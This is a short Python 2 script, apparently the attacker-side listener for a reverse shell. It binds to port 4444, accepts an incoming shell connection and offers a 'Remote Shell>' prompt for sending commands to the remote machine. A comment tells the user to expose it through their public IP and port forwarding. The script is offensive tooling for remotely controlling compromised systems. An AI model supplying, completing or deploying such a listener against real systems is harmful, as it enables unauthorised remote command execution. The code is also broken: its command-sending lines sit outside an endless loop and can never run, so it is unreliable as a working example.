import socket
import sys

# This host should be your public ip, use port forwarding #
host = '192.168.244.1'
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((host, port))
server.listen(5)

print("[*] Server bound to %s:%d" % (host, port))
connected = False
while 1:
	if not connected:
		(client, address) = server.accept()
		connected = True
	print("[*] Accepted shell connection")
	buff = ""
	while 1:
		try:
			recv_buffer = client.recv(4096)
			
			print("[*] Recieved: %s" % recv_buffer)
			if not len(recv_buffer):
				break
			else:
				buff += recv_buffer
		except:
			break

command = raw_input("Remote Shell> ")
client.sendall(command + "\r\n\r\n")
print("[*] Sent -> %s" % command)
